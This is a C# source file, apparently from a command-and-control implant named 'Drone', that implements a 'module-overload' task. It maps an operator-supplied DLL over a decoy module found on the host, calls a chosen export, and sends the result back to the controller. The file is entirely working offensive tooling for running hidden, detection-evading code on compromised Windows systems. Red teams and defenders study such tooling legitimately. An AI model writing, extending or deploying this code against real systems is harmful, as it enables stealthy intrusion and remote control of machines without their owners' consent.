using System.Linq;
using System.Runtime.InteropServices;

using DInvoke.DynamicInvoke;
using DInvoke.ManualMap;

using Drone.Models;

namespace Drone.Functions;

public class ModuleOverload : DroneFunction
{
    public override string Name => "module-overload";
    
    public override void Execute(DroneTask task)
    {
        // find a decoy
        var decoy = Overload.FindDecoyModule(task.Artefact.Length);
        
        if (string.IsNullOrWhiteSpace(decoy))
        {
            Drone.SendError(task.TaskId, "Unable to find a suitable decoy module");
            return;
        }

        // map the module
        var map = Overload.OverloadModule(task.Artefact, decoy);
        var export = task.Parameters[0];

        object[] parameters = { };
        
        if (task.Parameters.Length > 1)
            parameters = new object[] { string.Join(" ", task.Parameters.Skip(1)) };

        // run
        var result = (string) Generic.CallMappedDLLModuleExport(
            map.PEINFO,
            map.ModuleBase,
            export,
            typeof(GenericDelegate),
            parameters);

        // return output
        Drone.SendOutput(task.TaskId, result);
    }
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    private delegate string GenericDelegate(string input);
}